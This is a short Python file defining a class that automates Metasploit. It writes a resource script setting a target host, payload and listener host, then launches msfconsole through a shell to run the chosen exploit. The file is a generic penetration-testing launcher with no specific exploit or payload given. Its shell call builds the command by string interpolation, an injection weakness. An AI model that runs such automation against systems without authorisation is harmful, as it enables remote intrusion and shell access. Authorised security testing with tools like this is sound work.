import subprocess
from tempfile import NamedTemporaryFile

class MetasploitAutomator:
    def __init__(self, rhost: str, lhost: str):
        self.rhost = rhost
        self.lhost = lhost

    def run_exploit(self, exploit: str, payload: str) -> str:
        with NamedTemporaryFile(mode="w+", suffix=".rc") as rc_file:
            rc_file.write(f"""
                use {exploit}
                set RHOSTS {self.rhost}
                set PAYLOAD {payload}
                set LHOST {self.lhost}
                exploit
            """)
            rc_file.flush()
            result = subprocess.run(
                f"msfconsole -r {rc_file.name}",
                shell=True,
                capture_output=True,
                text=True
            )
            return result.stdout
